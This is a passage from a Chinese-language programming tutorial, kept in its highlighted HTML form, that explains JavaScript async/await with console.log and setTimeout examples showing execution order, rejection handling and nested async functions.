class="token function">fn3</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">res</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>res<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">catch</span><span class="token punctuation">(</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">error</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>error<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// ReferenceError: aaa is not defined</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>结果证明只会执行 <code>reject</code> 状态的情况下的语句，忽略了 <code>resolve</code> 时的代码，所以此处值得 <strong>注意</strong>；</p><h1 id="await"><a href="#await" class="headerlink" title="await"></a>await</h1><h2 id="概念-1"><a href="#概念-1" class="headerlink" title="概念"></a>概念</h2><p>用法顾名思义，有 <strong>等待</strong> 的意思，语法为：</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">var</span> value <span class="token operator">=</span> <span class="token keyword">await</span> <span class="token function">myPromise</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>所谓 <strong>等待</strong> 其实就是指暂停当前 <code>async function</code> 内部语句的执行，等待后面的 <code>myPromise()</code> 处理完返回结果后，继续执行 <code>async function</code> 函数内部的剩余语句；<code>myPromise()</code> 是一个 Promise对象，而自定义的变量 <code>value</code> 则用于获取 Promise 对象返回的 <strong>resolve</strong> 状态值；</p><h2 id="用法"><a href="#用法" class="headerlink" title="用法"></a>用法</h2><p>值得 <strong>注意</strong> 的是，<code>await</code> 必须在 <code>async function</code> 内使用，否则会提示语法错误；如果 await 后面跟的是其他值，则直接返回该值：</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">async</span> <span class="token keyword">function</span> <span class="token function">fn</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">var</span> result <span class="token operator">=</span> <span class="token keyword">await</span> <span class="token keyword">new</span> <span class="token class-name">Promise</span><span class="token punctuation">(</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">resolve<span class="token punctuation">,</span> reject</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token function">setTimeout</span><span class="token punctuation">(</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token function">resolve</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token number">2000</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>result<span class="token punctuation">)</span><span class="token punctuation">;</span>    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token keyword">await</span> <span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 4 会被直接返回</span><span class="token punctuation">&#125;</span><span class="token function">fn</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// 1</span><span class="token comment">// 2 (2 秒后输出)</span><span class="token comment">// 3</span><span class="token comment">// 4</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>如果不用获取返回值，也可以直接执行语句：</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">async</span> <span class="token keyword">function</span> <span class="token function">fn</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">await</span> <span class="token keyword">new</span> <span class="token class-name">Promise</span><span class="token punctuation">(</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">resolve<span class="token punctuation">,</span> reject</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token function">setTimeout</span><span class="token punctuation">(</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token function">resolve</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token number">2000</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token function">fn</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// 1</span><span class="token comment">// 2 (2 秒后)</span><span class="token comment">// 3</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="返回结果"><a href="#返回结果" class="headerlink" title="返回结果"></a>返回结果</h2><p>如之前所说，await 会等到后面的 Promise <strong>返回结果</strong> 后才会执行 async 函数后面剩下的语句，也就是说如果 Promise 不返回结果（如 resolve 或 reject），后面的代码就不会执行，例如：</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">async</span> <span class="token keyword">function</span> <span class="token function">fn</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">await</span> <span class="token keyword">new</span> <span class="token class-name">Promise</span><span class="token punctuation">(</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">resolve<span class="token punctuation">,</span> reject</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token function">setTimeout</span><span class="token punctuation">(</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token number">2000</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token function">fn</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// 1</span><span class="token comment">// 2 (2 秒后输出，并且后面不会继续输出 3)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这里可以理解为函数会一直等待 await 返回结果（resolve / reject）才会执行剩下的语句，没有返回结果就会一直等下去，也就一直等不到剩下的语句执行了（还挺痴情-_-）；</p><p>如果 await 后面的 Promise 返回一个 <code>reject</code> 状态的结果的话，则会被当成错误在后台抛出，例如：</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">async</span> <span class="token keyword">function</span> <span class="token function">fn</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">var</span> result <span class="token operator">=</span> <span class="token keyword">await</span> <span class="token keyword">new</span> <span class="token class-name">Promise</span><span class="token punctuation">(</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">resolve<span class="token punctuation">,</span> reject</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token function">setTimeout</span><span class="token punctuation">(</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token function">reject</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token number">2000</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token function">fn</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// 1</span><span class="token comment">// Uncaught (in promise) 2 (2 秒后输出)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>如上，2 秒后会抛出出错误，并且 3 这个数并没有被输出，说明后面的执行也被忽略了；</p><h2 id="匿名函数"><a href="#匿名函数" class="headerlink" title="匿名函数"></a>匿名函数</h2><p>async 也可以用于申明匿名函数用于不同场景，或者嵌套使用 async 函数，如 <code>await async</code> 的形式，只是要在 await 后面使用 async 形式的函数的话，需要这个函数立即执行且有返回值；</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">let</span> <span class="token function-variable function">fn</span> <span class="token operator">=</span> <span class="token keyword">async</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">let</span> a <span class="token operator">=</span> <span class="token keyword">await</span> <span class="token punctuation">(</span><span class="token keyword">async</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token number">2</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">async</span> <span class="token keyword">function</span> <span class="token function">fn2</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token number">3</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token keyword">await</span> <span class="token function">fn2</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token function">fn</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// 1</span><span class="token comment">// 2</span><span class="token comment">// 3</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>另外，await 后面的 Promise 返回的 reject， 也可以被该 async 函数返回的 Promise 对象以 reject 状态获取，例如：</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">async</span> <span class="token keyword">function</span> <span class="token function">fn</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">var</span> result <span class="token operator">=</span> <span class="token keyword">await</span> <span class="token keyword">new</span> <span class="token class-name">Promise</span><span class="token punctuation">(</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">resolve<span class="token punctuation">,</span> reject</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token function">setTimeout</span><span class="token punctuation">(</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token function">reject</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token number">2000</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token function">fn</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">catch</span><span class="token punctuation">(</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">error</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>error<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// 1</span><span class="token comment">// 2 (2 秒后输出)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这种情况就不会以错误抛出，直接对异常值进行了处理，并且最后同样没有输出数字 3，即后面的代码依然被忽略了；</p><h1 id="注意事项"><a href="#注意事项" class="headerlink" title="注意事项"></a>注意事项</h1><h2 id="非-await-部分"><a href="#非-await-部分" class="headerlink" title="非 await 部分"></a>非 await 部分</h2><p><code>async/await</code> 函数以同步的方式书写异步函数确实方便了不少场景，如定义所讲，函数内部遇到 <code>await</code> 会等到返回结果再继续执行下去，也就是说，非 await 部分仍然会以正常的异步或同步方式执行，例如遇到 <code>setTimeout()</code> 就会放入任务队列等待同步语句执行完后再执行；</p><p>比如以下情况：</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">async</span> <span class="token keyword">function</span> <span class="token function">fn</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">await</span> <span class="token keyword">new</span> <span class="token class-name">Promise</span><span class="token punctuation">(</span><span class="token parameter">resolve</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>        <span class="token function">setTimeout</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>            console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token function">resolve</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token number">1000</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">setTimeout</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>        console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token function">fn</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// 0</span><span class="token comment">// 1（2 秒后）</span><span class="token comment">// 3</span><span class="token comment">// 2</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="await-内部"><a href="#await-内部" class="headerlink" title="await 内部"></a>await 内部</h2><p>虽然说函数会等待 await 返回结果在继续执行，但是 await 内部的代码也依然按正常的同步和异步执行，例如：</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">async</span> <span class="token keyword">function</span> <span class="token function">fn</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">setTimeout</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>        console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">await</span> <span class="token keyword">new</span> <span class="token class-name">Promise</span><span class="token punctuation">(</span><span class="token parameter">resolve</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>        <span class="token function">setTimeout</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>            console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">setTimeout</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>            console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token function">resolve</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token number">1000</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">setTimeout</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>            console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">setTimeout</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>        console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token function">fn</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// 0</span><span class="token comment">// 3</span><span class="token comment">// 1</span><span class="token comment">// 2</span><span class="token comment">// 5</span><span class="token comment">// 4（2 秒后）</span><span class="token comment">// 7</span><span class="token comment">// 6</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>上面的代码中返回结果的函数 <code>resolve()</code> 是在 <code>setTimeout()</code> 这个 <strong>异步任务</strong> 中，所以其被丢到事件队列中等待 2 秒再执行，由于此时 await 还未返回结果，所以还不会去执行 await 以外的代码（输出 7、6），而是先执行同为异步任务、但延时较短的输出 1、2、5 的代码；2 秒后结果返回了，就会继续正常执行 await 以外的同步任务和异步任务了；</p><p>但是假如 await 代码内返回结果的函数（resolve() 或 reject()）是在 <strong>同步任务</strong> 中执行的话，情况就有些不一样了，例如：</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">async</span> <span class="token keyword">function</span> <span class="token function">fn</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">setTimeout</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>        console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">await</span> <span class="token keyword">new</span> <span class="token class-name">Promise</span><span class="token punctuation">(</span><span class="token parameter">resolve</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>        <span class="token function">setTimeout</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>            console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">resolve</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">setTimeout</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>            console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">setTimeout</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>        console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token function">fn</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// 0 </span><span class="token comment">// 3</span><span class="token comment">// 4</span><span class="token comment">// 7</span><span class="token comment">// 1</span><span class="token comment">// 2</span><span class="token comment">// 5</span><span class="token comment">// 6</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>由于同步任务 <strong>先于</strong> 异步任务执行的机理，在同步任务执行过程中依次输出了 0、3 后，就立即执行了 <code>resolve()</code> 使得 await 得到了返回结果，再往后就继续同步的输出了 4，但是输出 5 的代码是异步任务，与输出 1、2 的代码一并放入任务队列，此时由于 await 返回了结果，所以可以执行 await 以外的代码了，输出 6 是异步任务，于是先输出了同步任务的 7，同步任务都执行完了，最后执行任务队列中的异步任务，按之前进入队列的顺序，就是依次输出 1、2、5、6，所有代码运行结束；</p><h2 id="函数嵌套"><a href="#函数嵌套" class="headerlink" title="函数嵌套"></a>函数嵌套</h2><p>当 async 函数中嵌套着其他 async 函数时，执行过程可能又有些和预想的不一样，先来看下面的例子：</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">async</span> <span class="token keyword">function</span> <span class="token function">fn</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">setTimeout</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>        console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">(</span><span class="token keyword">async</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token function">setTimeout</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>            console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">await</span> <span class="token keyword">new</span> <span class="token class-name">Promise</span><span class="token punctuation">(</span><span class="token parameter">res</span> <span class="token operator">=></span> <span class="token function">setTimeout</span><span class="token punctuation">(</span>res<span class="token punctuation">,</span> <span class="token number">1000</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token function">setTimeout</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>            console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token number">1000</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token number">6</span><span 